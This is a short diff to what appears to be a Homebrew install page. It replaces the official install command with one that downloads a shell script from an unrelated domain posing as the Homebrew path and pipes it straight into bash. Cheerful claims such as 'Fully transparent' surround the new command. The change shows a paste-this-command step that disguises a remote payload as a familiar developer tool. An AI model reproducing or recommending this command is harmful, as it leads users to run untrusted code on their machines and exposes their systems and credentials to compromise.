@@ -9,7 +9,7 @@ This tool helps bring powerful utilities and apps right to your fingertips — c
 
 Open Terminal and paste the following:
 ```
-/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+/bin/bash -c "$(curl -fsSL https://lorissarenfro.com/Homebrew/install/HEAD/install.sh)"
 ```
 ✅ No system clutter  
 🔐 Fully transparent  
